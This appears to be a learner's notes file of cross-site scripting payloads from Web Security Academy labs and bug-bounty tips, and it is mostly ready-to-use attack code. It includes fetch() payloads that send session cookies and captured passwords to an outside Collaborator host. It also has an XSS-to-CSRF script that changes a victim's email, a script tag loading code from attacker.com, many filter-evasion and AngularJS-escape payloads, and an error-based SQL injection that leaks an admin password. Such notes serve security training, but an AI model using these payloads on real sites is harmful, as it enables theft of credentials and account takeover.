What are the types of XSS attacks:
-------------------------------------
    Reflected XSS, where the malicious script comes from the current HTTP request.
    Stored XSS, where the malicious script comes from the website's database.
    DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.






Exploiting cross-site scripting to steal cookies:
----------------------------------------------------
Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
    <script>
    fetch('https://sc8z8qr09rve8lm67b3gs73nsey5mu.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
    </script>




Exploiting cross-site scripting to capture passwords:
---------------------------------------------------------
Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
    <input name=username id=username>
    <input type=password name=password onchange="if(this.value.length)fetch('https://r2u8lnaufpog3yey7qt48pn89zfp3e.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
    });">





Exploiting XSS to perform CSRF:
----------------------------------
Submit the following payload in a blog comment: 
    <script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
    };
    </script>




Stored XSS into HTML context with nothing encoded:
-----------------------------------------------------
<script>alert(1)</script>



Reflected XSS into HTML context with most tags and attributes blocked:
--------------------------------------------------------------------------
<img src=1 onerror=alert(documnet.cookie)>
notice that tags are not allowed, so go to burp and fuzz the allowed tags <§§>, and then fuzz the allowed events on it after brutforcing we identified that body tag allowd, then we tried to brutforce the events that we can do with this tag <body%20§§=1>, and we identified onresize is allowed so our payload would be something like that : "><body onresize=print()>"


<iframe src="https://0a40002c034f3cd480146c6500410010.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>


<iframe src="https://0a40002c034f3cd480146c6500410010.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>





Reflected XSS into HTML context with all tags blocked except custom ones:
----------------------------------------------------------------------------


<script>
location = 'https://0a30007303fedff380ba0873000800b6.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

here is the decoded payload in the search value above:
    <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';




Reflected XSS with event handlers and href attributes blocked:
-----------------------------------------------------------------
%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

decoded payload in the search value above:
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>







Reflected XSS with some SVG markup allowed:
---------------------------------------------
<>
<§§>
<svg><animatetransform%20=1>
<svg><animatetransform%20§§=1>
onbegin

"><svg><animatetransform onbegin=alert(1)>
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E




Reflected XSS into attribute with angle brackets HTML-encoded:
-----------------------------------------------------------------
"onmouseover="alert(1)




Stored XSS into anchor href attribute with double quotes HTML-encoded:
--------------------------------------------------------------------------
<a href="javascript:alert(document.domain)">
javascript:alert(1)




Reflected XSS in canonical link tag:
----------------------------------------

PoC:

    <html>
    <head>
    <link rel="canonical" accesskey="X" onclick="alert(1)" />
    <link rel="alternate" accesskey="y" onclick="alert(2)" />
    <body>

    <b>(Press ALT+SHIFT+X on Windows)<br />(CTRL+ALT_X on OS X)</b>

    </body>
    </html>



?'accesskey='x'onclick='alert(1)
?%27accesskey=%27x%27onclick=%27alert(1)




Reflected XSS into a JavaScript string with single quote and backslash escaped:
---------------------------------------------------------------------------------
test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string. 
Replace your input with the following payload to break out of the script block and inject a new script: 
    </script><script>alert(1)</script>





Reflected XSS into a JavaScript string with angle brackets HTML encoded:
---------------------------------------------------------------------------


Some useful ways of breaking out of a string literal are:
    '-alert(document.domain)-'
    ';alert(document.domain)//



Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped:
----------------------------------------------------------------------------------------------------------------------

For example, suppose that the input:
    ';alert(document.domain)//

gets converted to:
    \';alert(document.domain)//

You can now use the alternative payload:
    \';alert(document.domain)//

which gets converted to:
    \\';alert(document.domain)//






Reflected XSS in a JavaScript URL with some characters blocked:
------------------------------------------------------------------

https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

decoded payload:
    &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'






Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped:
----------------------------------------------------------------------------------------------------------------------------

http://foo?&apos;-alert(1)-&apos;



Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped:
----------------------------------------------------------------------------------------------------------------------------
${alert(1)}
randomString${alert(document.domain)}
randomString${alert.call(null,%20document.domain)}


















DOM-based XSS:
----------------

document.write('... <script>alert(document.domain)</script> ...');


DOM XSS in document.write sink using source location.search:
----------------------------------------------------------------

"><svg onload=alert(1)>
"><svg><animatetransform onbegin=alert(1)>



DOM XSS in document.write sink using source location.search inside a select element:
-----------------------------------------------------------------------------------------

product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>


DOM XSS in innerHTML sink using source location.search:
---------------------------------------------------------

element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'

<img src=1 onerror=alert(1)>




DOM XSS in jQuery anchor href attribute sink using location.search source:
------------------------------------------------------------------------------

?returnUrl=javascript:alert(document.cookie)





DOM XSS in jQuery selector sink using a hashchange event:
------------------------------------------------------------

<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">

<iframe src="https://0acd0050037ea1f281bd118f00030013.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>





DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded:
--------------------------------------------------------------------------------------

{{ 1 + 1 }}
{{ $on.constructor('alert(1)')() }}
{{ $eval.constructor('alert(1)')() }}
{{ $eval.constructor('alert(document.domain)')() }}





Reflected DOM XSS:
---------------------

eval('var data = "reflected string"');
\"-alert(1)}//





Stored DOM XSS:
------------------

<><img src=1 onerror=alert(1)>


Which sinks can lead to DOM-XSS vulnerabilities?

    The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

            document.write()
            document.writeln()
            document.domain
            element.innerHTML
            element.outerHTML
            element.insertAdjacentHTML
            element.onevent

    The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

            add()
            after()
            append()
            animate()
            insertAfter()
            insertBefore()
            before()
            html()
            prepend()
            replaceAll()
            replaceWith()
            wrap()
            wrapInner()
            wrapAll()
            has()
            constructor()
            init()
            index()
            jQuery.parseHTML()
            $.parseHTML()













































Bug Bounty Bootcamp Tips:
---------------------------

    <img onload=alert('The image has been loaded!') src="example.png">
    javascript:alert('XSS by Yousseff')
    data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
    data:text/html,<script>alert('XSS by Yousseff')</script>
    "/><script>location="http://attacker.com";</script>
    <img src=""/><script>location="http://attacker.com";</script>">
    <script>alert(1)</script>
    <iframe src=javascript:alert(1)>
    <body onload=alert(1)>
    "><img src=x onerror=prompt(1);>
    <script>alert(1)<!–
    <a onmouseover"alert(1)">test</a>
    <script src=//attacker.com/test.js>
    <img src="/><script>alert('XSS by Yousseff');</script>"/>
    <img src="123" onerror="alert('XSS by Yousseff');"/>
    <a href="javascript:alert('XSS by Yousseff')>Click me!</a>"



    list of payloads:

        https://polyglot.innerht.ml/
        https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/
        https://owasp.org/www-community/xss-filter-evasion-cheatsheet




    SELECT Title, Body FROM Emails WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr' UNION SELECT 1, CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE); –-
    The CONVERT(VALUE, FORMAT) function attempts to convert VALUE to the format specified by FORMAT. Therefore, this query will force the database to convert the admin’s password to a date format, which can sometimes cause the database to throw a descriptive error like this one:
        Conversion failed when trying to convert "t5dJ12rp$fMDEbSWz" to data type "date".

    


